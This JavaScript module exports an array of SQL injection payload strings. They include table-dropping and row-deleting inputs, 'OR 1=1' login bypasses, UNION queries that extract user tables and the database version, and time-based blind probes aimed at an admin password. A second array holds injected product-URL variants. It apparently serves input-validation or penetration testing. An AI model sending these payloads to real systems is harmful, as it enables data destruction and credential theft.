const arraySql = [
  "'; DROP TABLE users; --",
  "'; SELECT * FROM users WHERE 1 = 1; --",
  "'; DELETE FROM users WHERE 1 = 1; --",
  "'; ROLLBACK; --",
  "' OR 1=1 --",
  '" OR 1=1 --',
  "'' OR 1 = 1; --",
  '"" OR 1 = 1; --',
  "`` OR 1 = 1; --",
  "` OR 1 = 1; --",
  "! OR 1 = 1; --",
  "= OR 1 = 1; --",
  "' OR 1 = 1; --",  // Clause Injection
  "' OR 1 = 1; /*",
  "' AND 1=0 --",
  "' SELECT IF(1=1, sleep(10), NULL)",
  "' UNION SELECT * FROM users; --",
  "' UNION SELECT @@version --",
  "' OR SUBSTRING(email, 1, 1) = 'a'; --",
  "' OR CONCAT(first_name, ' ', last_name) = 'John Smith'; --"
 // "' SELECT IF((SELECT password FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'o'), sleep(10), NULL)",
  // "SELECT * FROM users WHERE username='admin' AND password='password' OR '1'='1'"
  // "SELECT * FROM users WHERE username='$username' AND password='$password' --'"  // union
  // "' OR (SELECT COUNT(*) FROM users WHERE username = 'admin' AND password = 'password') > 0; --" // subquerys
  // "' UNION SELECT * FROM users WHERE username = 'admin' AND password = 'password'; --"
  // "' UNION SELECT * FROM users WHERE username = 'admin' AND password = 'password'; --"
  // "' UNION SELECT * FROM users WHERE username = 'admin' AND password = 'password'; --"
  // "SELECT * FROM users WHERE username='$username' AND password='' OR '1'='1'"
  // "SELECT * FROM users WHERE username='$username' AND password='$password' UNION SELECT * FROM users"
  // "SELECT * FROM users WHERE username='$username' AND password='$password' UNION SELECT * FROM *"
  // "SELECT * FROM *"
  // '; SELECT * FROM users WHERE username = 'admin' --
  // ' OR (SELECT COUNT(*) FROM users WHERE username = 'admin' AND password = 'password') > 0; --
  // "'; SELECT * FROM users WHERE username = 'admin' --"
  // 	SELECT * FROM products WHERE category = 'keyboards'--' AND published = 1
  // SELECT * FROM products WHERE category = 'keyboards' OR 1=1--' AND published = 1
  // SELECT * FROM users WHERE username = 'admin'--' AND password = ''
];

const urls = [
  "products?category=keyboards",
  "products?category=keyboards'--",
  "products?category=keyboards'+OR+1=1--"
]

module.exports = arraySql;


